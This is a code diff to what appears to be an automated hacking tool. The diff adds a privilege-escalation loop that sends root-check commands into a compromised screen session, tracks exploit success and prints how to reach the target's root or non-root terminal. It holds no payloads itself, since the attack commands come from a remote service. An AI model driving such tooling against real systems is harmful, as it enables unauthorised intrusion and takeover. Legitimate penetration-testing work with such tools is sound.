@@ -31,6 +31,11 @@ class Colors:
     BOLD = '\033[1m'
 
 
+class SuccessStatus:
+    EXPLOIT_UNSUCCESSFUL = 'EXPLOIT_UNSUCCESSFUL'
+    EXPLOIT_SUCCESSFUL = 'EXPLOIT_SUCCESSFUL'
+    PRIVILEGE_ESCALATE_SUCCESSFUL = 'PRIVILEGE_ESCALATE_SUCCESSFUL'
+
 class Utils:
     class AutoHackException(Exception):
         pass
@@ -409,11 +414,11 @@ class AutoHack:
         log_directory = os.path.join(self.scan_directory, 'logs')
         self.exploit_directory = os.path.join(output_directory, 'exploit')
         self.exploit_commands_attempted_directory = os.path.join(self.exploit_directory, 'commands_attempted')
-        priv_directory = os.path.join(output_directory, 'priv')
+        self.priv_directory = os.path.join(output_directory, 'priv')
         loot_directory = os.path.join(output_directory, 'loot')
         Utils.make_directories(
             self.scan_directory, xml_directory, log_directory,
-            self.exploit_directory, priv_directory, loot_directory,
+            self.exploit_directory, self.priv_directory, loot_directory,
             self.exploit_commands_attempted_directory
         )
 
@@ -426,6 +431,9 @@ class AutoHack:
         self.exploit_steps_log = os.path.join(log_directory, 'exploit_steps.log')
         self.patterns_detected_log = os.path.join(log_directory, 'patterns.log')
         self.session_id: str | None = None
+        self.spearhead_index_unique_id: str | None = None
+        self.expected_command_answers_to_verify_root_access: dict = {}
+        self.success_status = SuccessStatus.EXPLOIT_UNSUCCESSFUL
         Utils.clear_file(self.exploit_steps_log)
 
     def get_config(self, config_directory: str):
@@ -660,6 +668,7 @@ class AutoHack:
 
         # let heart beat thread complete after process
         self.process_manager.heart_beat_process.join()
+        print('\n\n')
         Utils.print_time()
 
     def execute_secondary_enumerate_command(
@@ -886,14 +895,14 @@ class AutoHack:
         commands = attack['attack_commands']['command_group']
         is_blocking = attack['attack_commands']['meta']['command_should_block']
         vul_name = attack['attack_commands']['vulnerability_name'].strip()
-        main_command_index = attack['attack_commands']['meta']['continuation_index']
+        spearhead_index = attack['attack_commands']['meta']['spearhead_index']
 
         print(f'{Colors.CYAN}RUNNING ATTACK COMMANDS FOR:{Colors.END} {vul_name}:\n')
 
         for index, command in enumerate(commands):
             unique_screen_name = str(uuid.uuid4())
-            if main_command_index == index:
-                attack['main_command_unique_id'] = unique_screen_name
+            if spearhead_index == index:
+                self.spearhead_index_unique_id = unique_screen_name
 
             command_file_path = os.path.join(
                 self.exploit_commands_attempted_directory,
@@ -939,9 +948,8 @@ class AutoHack:
         # slow execution to ensure attack ran
         time.sleep(2)
 
-        main_command_unique_id = attack['main_command_unique_id']
-        output_file_path =  os.path.join(self.exploit_directory, f'{main_command_unique_id}.txt')
-        grab_screen_command = f"screen -r {main_command_unique_id} -X hardcopy {output_file_path}"
+        output_file_path =  os.path.join(self.exploit_directory, f'{self.spearhead_index_unique_id}.txt')
+        grab_screen_command = f"screen -r {self.spearhead_index_unique_id} -X hardcopy {output_file_path}"
 
         # create file with contents
         self.run_command(grab_screen_command, False)
@@ -964,6 +972,8 @@ class AutoHack:
             Gets the best attack based on the previous enumeration output
             and then implements attack until all attacks have been exhausted
         """
+        self.upload_enumeration_files()
+
         while True:
             best_attack = self.get_best_attack()
             if not best_attack['should_continue']:
@@ -974,7 +984,128 @@ class AutoHack:
             if self.attack_is_successful(best_attack):
                 message = f"\t{Colors.GREEN}{Colors.BOLD}ATTACK SUCCESSFUL{Colors.END} [at {int(time.time())}]\n"
                 print(message)
+                self.success_status = SuccessStatus.EXPLOIT_SUCCESSFUL
                 break
+
+    def get_is_user_root_commands(self) -> dict:
+        """
+        Requests commands and expected answers
+        that verify root access
+        """
+        headers = {
+            'API_KEY': self.api_key,
+            'session_id': self.session_id,
+        }
+        url = f'{self.api_source}/get-is-user-root-commands'
+        response = requests.post(url, headers=headers)
+        response_data = response.json()
+        return response_data
+
+    def user_is_root(self) -> bool:
+        for key_command in self.expected_command_answers_to_verify_root_access:
+            """
+                * Runs verification command on spearhead terminal session
+                * Runs grab screen session command
+                * Examines the output for expected command answers
+            """
+            data = self.expected_command_answers_to_verify_root_access[key_command]
+            expected_output_when_root = data['answer']
+            command_wait_time_in_seconds = data['wait']
+
+            verify_command = f'screen -S {self.spearhead_index_unique_id} -X stuff "{key_command}"'
+            self.run_command(verify_command, False)
+
+            # delay so command will run
+            time.sleep(command_wait_time_in_seconds)
+
+            output_file_path =  os.path.join(
+                self.priv_directory,
+                f'{self.spearhead_index_unique_id}.txt'
+            )
+
+            # use the current output file size so we can get the newly written content
+            output_filesize_before_running_command = 0
+            if os.path.exists(output_file_path):
+                output_filesize_before_running_command = os.path.getsize(output_file_path)
+
+            grab_screen_command = f"screen -r {self.spearhead_index_unique_id} -X hardcopy {output_file_path}"
+            self.run_command(grab_screen_command, False)
+
+            output_file_handle = open(output_file_path, 'r')
+            output_file_handle.seek(output_filesize_before_running_command)
+            output_produced_by_command = output_file_handle.read()
+
+            if expected_output_when_root in output_produced_by_command:
+                self.success_status = SuccessStatus.PRIVILEGE_ESCALATE_SUCCESSFUL
+                return True
+
+        return False
+
+    @staticmethod
+    def print_user_is_root_successful():
+        message = (
+            f'\t{Colors.GREEN}{Colors.BOLD}ROOT ACCESS SUCCESSFUL{Colors.END}'
+        )
+        print(message)
+
+    @staticmethod
+    def print_user_is_root_unsuccessful():
+        message = (
+            f'\t{Colors.RED}{Colors.BOLD}ROOT ACCESS UNSUCCESSFUL{Colors.END}'
+        )
+        print(message)
+
+    def privilege_escalate_repeatedly(self):
+        """
+            when user is not root
+                -enumerate
+                -repeatedly attack and check for root access
+        """
+        # load the expected root command-answers once
+        self.expected_command_answers_to_verify_root_access = self.get_is_user_root_commands()
+
+        message = (
+            f'\n\n'
+            f'{Colors.CYAN}VERIFYING ROOT ACCESS:{Colors.END}'
+        )
+        print(message)
+
+        if self.user_is_root():
+            self.print_user_is_root_successful()
+            return
+        else:
+            self.print_user_is_root_unsuccessful()
+
+        # todo: enumerate target os
+        # todo: upload target os enumeration data
+
+        # repeatedly exploit and check for root access
+        tries = 0
+        while True:
+            # todo: attack
+            if self.user_is_root():
+                break
+
+            if tries > 5:
+                break
+
+            tries += 1
+
+    def handle_success(self):
+        if self.success_status == SuccessStatus.PRIVILEGE_ESCALATE_SUCCESSFUL:
+            message = (
+                f'\n\n\n'
+                f'{Colors.CYAN}{Colors.BOLD}TO ACCESS TARGET ROOT TERMINAL, RUN COMMAND:{Colors.END}\n'
+                f'{Colors.GREEN}{Colors.BOLD}\tscreen -r {self.spearhead_index_unique_id}{Colors.END}'
+            )
+            print(message)
+        elif self.success_status == SuccessStatus.EXPLOIT_SUCCESSFUL:
+            message = (
+                f'\n\n\n'
+                f'{Colors.CYAN}{Colors.BOLD}TO ACCESS TARGET NON-ROOT TERMINAL, RUN COMMAND:{Colors.END}\n'
+                f'{Colors.GREEN}{Colors.BOLD}\tscreen -r {self.spearhead_index_unique_id}{Colors.END}'
+            )
+            print(message)
 
     def exploit(self) -> None:
         """
@@ -983,8 +1114,9 @@ class AutoHack:
         :return:
         """
         if self.professional:
-            self.upload_enumeration_files()
             self.attack_repeatedly()
+            self.privilege_escalate_repeatedly()
+            self.handle_success()
 
         AutoHack.should_kill_heart_beat = True
 
@@ -1009,7 +1141,8 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='Does Enumeration')
     parser.add_argument(
         '-i', '--ip_address', action='store', type=str,
-        dest='ip_address', help='IP Address', required=True
+        dest='ip_addr'
+             'ess', help='IP Address', required=True
     )
     parser.add_argument(
         '-ai', '--attacker_ip_address', action='store', type=str,
